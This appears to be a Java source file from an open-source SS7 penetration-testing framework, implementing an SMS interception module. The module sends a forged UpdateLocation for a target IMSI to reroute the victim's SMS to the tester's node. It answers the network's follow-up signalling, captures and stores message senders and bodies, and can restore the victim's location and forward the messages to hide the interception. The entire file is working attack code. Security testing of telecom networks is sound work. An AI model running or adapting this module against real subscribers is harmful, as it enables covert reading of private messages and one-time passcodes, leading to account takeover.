/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.interception;

import com.rodan.intruder.ss7.entities.dialog.Ss7MapDialog;
import com.rodan.intruder.ss7.entities.event.model.mobility.ClRequest;
import com.rodan.intruder.ss7.entities.event.model.mobility.IsdRequest;
import com.rodan.intruder.ss7.entities.event.model.mobility.IsdResponse;
import com.rodan.intruder.ss7.entities.event.model.mobility.UlResponse;
import com.rodan.intruder.ss7.entities.event.model.sms.FsmRequest;
import com.rodan.intruder.ss7.entities.event.model.sms.FsmResponse;
import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
import com.rodan.intruder.ss7.entities.event.service.MapSmsServiceListener;
import com.rodan.intruder.ss7.entities.payload.mobility.IsdPayload;
import com.rodan.intruder.ss7.entities.payload.mobility.IsdResponsePayload;
import com.rodan.intruder.ss7.entities.payload.mobility.UlPayload;
import com.rodan.intruder.ss7.entities.payload.sms.FsmPayload;
import com.rodan.intruder.ss7.entities.payload.sms.FsmResponsePayload;
import com.rodan.intruder.ss7.entities.payload.sms.MtFsmResponsePayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.interception.SmContent;
import com.rodan.intruder.ss7.usecases.model.interception.SmsInterceptionOptions;
import com.rodan.intruder.ss7.usecases.model.interception.SmsInterceptionResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.ApplicationException;
import com.rodan.library.model.error.ErrorCode;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

import java.util.ArrayList;
import java.util.List;

@Module(name = Ss7ModuleConstants.SMS_INTERCEPTION_NAME, category = Ss7ModuleConstants.INTERCEPTION_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.SMS_INTERCEPTION_DISPLAY_NAME, brief = Ss7ModuleConstants.SMS_INTERCEPTION_BRIEF,
        description = Ss7ModuleConstants.SMS_INTERCEPTION_DESCRIPTION, rank = Ss7ModuleConstants.SMS_INTERCEPTION_RANK,
        mainPayload = Constants.UL_PAYLOAD_NAME)
public class SmsInterceptionModule extends Ss7ModuleTemplate implements SignalingModule,
        MapMobilityServiceListener, MapSmsServiceListener {
    final static Logger logger = LogManager.getLogger(SmsInterceptionModule.class);

    protected List<FsmRequest> fsmRequestList;
    protected List<FsmRequest> mtFsmRequestList;

    private boolean smsIntercepted;
    private boolean ulResponseReceived;
    private boolean smscTcapBeginHandled;

    @Builder
    public SmsInterceptionModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
        setTaskWaitTime(Ss7ModuleTemplate.MAX_TASK_WAIT_TIME);
        this.smsIntercepted = false;
        this.ulResponseReceived = false;
        this.smscTcapBeginHandled = false;
        this.moduleResponse = SmsInterceptionResponse.builder().build();
        this.fsmRequestList = new ArrayList<>();
        this.mtFsmRequestList = new ArrayList<>();
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (SmsInterceptionOptions) moduleOptions;
        var payload = UlPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi()).hlrGt(options.getHlrGt())
                .currentMscGt(options.getCurrentMscGt()).currentVlrGt(options.getCurrentVlrGt())
                .forwardSmsToVictim(options.getForwardSmsToVictim())
                .cc(options.getCc()).ndc(options.getNdc()).mcc(options.getMcc()).mnc(options.getMnc())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addMobilityServiceListener(localSsn, this);
        getGateway().addSmsServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeMobilityServiceListener(localSsn, this);
            getGateway().removeSmsServiceListener(localSsn, this);
        }
    }

    @Override
    public void onInsertSubscriberDataRequest(IsdRequest request) {
        try {
            logger.debug("##### Received ISD request!");
            logger.debug(request);

            var dialog = request.getDialog();
            var invokeId = request.getInvokeId();
            dialog.setUserObject(invokeId);

            // On restore location, ISD will be received from HLR on the same TCAP dialog, instead of sending it to
            // new MSC. Intruder should forward it to new MSC
            var forwardSmToVictim = "Yes".equalsIgnoreCase(((UlPayload) getMainPayload()).getForwardSmsToVictim());
            if (smsIntercepted && forwardSmToVictim) {
                var payload = (UlPayload) getMainPayload();
                var newMscIsdPayload = IsdPayload.builder()
                        .imsi(payload.getImsi()).localGt(payload.getLocalGt()).targetHlrGt(payload.getHlrGt())
                        .targetVlrGt(payload.getCurrentVlrGt())
                        .build();
                var forwarderPayload = getGateway().generateForwarderPayload(request, newMscIsdPayload);
                setCurrentPayload(forwarderPayload);
                execute();
            }

            var msisdn = request.getMsisdn();
            var hlrGt = request.getHlrGt();
            var sgsn = request.getSgsn();
            logger.debug("Received ISD request for MSISDN: " + msisdn + " from HLR: " + hlrGt +
                    " with SGSN: " + sgsn);
            var idsResponsePayload = IsdResponsePayload.builder()
                    .invokeId(invokeId)
                    .build();
            getGateway().addToDialog(idsResponsePayload, dialog);
            getGateway().send(dialog);
            logger.debug("ISD response sent.");

        } catch (ApplicationException e) {
            String msg = "Failed to handle ISD request";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }

    }

    @Override
    public void onInsertSubscriberDataResponse(IsdResponse response) {
        logger.debug("##### Received ISD response!");
        logger.debug(response);
    }

    @Override
    public void onUpdateLocationResponse(UlResponse response) {
        logger.debug("##### Received UL response!");
        logger.debug(response);
        this.ulResponseReceived = true;
        notify("Received UL ACK, waiting for SMS message", NotificationType.PROGRESS);
    }

    @Override
    public void onForwardShortMessageRequest(FsmRequest request) {
        try {
            logger.debug("##### Received ForwardSM request!");
            logger.debug(request);
            fsmRequestList.add(request);
            handleSm(request, false);

        } catch (SystemException e) {
            String msg = "Failed to handle FSM request.";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    @Override
    public void onMtForwardShortMessageRequest(FsmRequest request) {
        try {
            logger.debug("##### Received MTForwardSM request!");
            logger.debug(request);
            mtFsmRequestList.add(request);
            handleSm(request, true);
        } catch (SystemException e) {
            String msg = "Failed to handle MT-FSM request.";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    @Override
    public void onForwardShortMessageResponse(FsmResponse response) {
        logger.debug("##### Received ForwardSM response!");
        logger.debug(response);
        setResultReceived(true);
    }

    @Override
    public void onMtForwardShortMessageResponse(FsmResponse response) {
        logger.debug("##### Received MTForwardSM response!");
        logger.debug(response);
        setResultReceived(true);
    }

    @Override
    public void onCancelLocationRequest(ClRequest request) {
        try {
            logger.debug("##### Received ClRequest request!");
            logger.debug(request);
            var forwardSmToVictim = "Yes".equalsIgnoreCase(((SmsInterceptionOptions) getModuleOptions()).getForwardSmsToVictim());
            if (smsIntercepted && forwardSmToVictim) {
                var payload = (UlPayload) getMainPayload();
//                    var options = (SmsInterceptionOptionsNew) moduleOptions;
                var fsmPayload = FsmPayload.builder()
                        .targetMscGt(payload.getCurrentMscGt()).localGt(payload.getLocalGt())
                        .build();

                for (var fsmRequest : fsmRequestList) {
                    var forwarderPayload = getGateway().generateForwarderPayload(fsmRequest, fsmPayload);
                    setCurrentPayload(forwarderPayload);
                    execute();
                }

                for (var mtFsmRequest : mtFsmRequestList) {
                    var forwarderPayload = getGateway().generateForwarderPayload(mtFsmRequest, fsmPayload);
                    setCurrentPayload(forwarderPayload);
                    execute();
                }

            } else {
                notify("CL request received, victim may have performed UL.", NotificationType.WARNING);
                setExecutionError(true);
            }

        } catch (ApplicationException e) {
            String msg = "Failed to handle CL request.";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    @Override
    public void onDialogDelimiter(Ss7MapDialog dialog) {
        try {
            // SMSC may start with an empty TCAP-Begin before sending the FSM message
            if (ulResponseReceived && !smsIntercepted && !smscTcapBeginHandled) {
                logger.debug("Received a TCAP-Begin from SMSC with no MAP components. Sending TCAP-Continue to receive FSM message");
                getGateway().send(dialog); // Fire TCAP-continue
                smscTcapBeginHandled = true;
            }
        } catch (SystemException e) {
            setExecutionError(true);
        }
    }

    private void handleSm(FsmRequest request, boolean isMtFsm) throws SystemException {
        var message = SmContent.builder().senderNode(request.getSenderNode()).sender(request.getSender())
                .receiver(request.getReceiver()).timeStamp(request.getTimeStamp()).body(request.getBody()).build();
        storeMessage(message);

        var forwardSmToVictim = "Yes".equalsIgnoreCase(((SmsInterceptionOptions) getModuleOptions()).getForwardSmsToVictim());
        if (forwardSmToVictim) {
            if (!request.isHasMoreMessages()) {
                smsIntercepted = true;
                restoreLocation();
            }

        } else {
            var dialog = request.getDialog();
            var invokeId = request.getInvokeId();
            dialog.setUserObject(invokeId);

            var responsePayload = (isMtFsm) ? MtFsmResponsePayload.builder().invokeId(invokeId).build() :
                    FsmResponsePayload.builder().invokeId(invokeId).build();
            getGateway().addToDialog(responsePayload, dialog);
            getGateway().send(dialog);

            if (!request.isHasMoreMessages()) {
                smsIntercepted = true;
                setResultReceived(true);
            }
        }
        logger.debug("SMS intercepted");

    }

    private void storeMessage(SmContent newMessage) {
        var messageList = ((SmsInterceptionResponse) moduleResponse).getSmsList();
        var existingMessage = messageList.stream()
                .filter(msg -> msg.getSender().equalsIgnoreCase(newMessage.getSender())).findFirst();
        if (existingMessage.isPresent()) {
            existingMessage.get().setBody(existingMessage.get().getBody() + newMessage.getBody());
        } else {
            messageList.add(newMessage);
        }
    }

    private void restoreLocation() throws SystemException {
        try {
            var payload = (UlPayload) getMainPayload();
            var newMscUlPayload = UlPayload.builder()
                    .imsi(payload.getImsi()).newMscGt(payload.getCurrentMscGt())
                    .newVlrGt(payload.getCurrentVlrGt()).mapVersion(payload.getMapVersion())
                    .mcc(payload.getMcc()).mnc(payload.getMnc()).cc(payload.getCc()).ndc(payload.getNdc())
                    .localGt(payload.getLocalGt())
                    .build();
            setCurrentPayload(newMscUlPayload);
            execute();

        } catch (ApplicationException e) {
            String msg = "Failed to send ISD response";
            logger.error(msg, e);
            setExecutionError(true);
            throw SystemException.builder().code(ErrorCode.MODULE_REQUEST_ERROR).message(msg).parent(e).build();
        }
    }
}
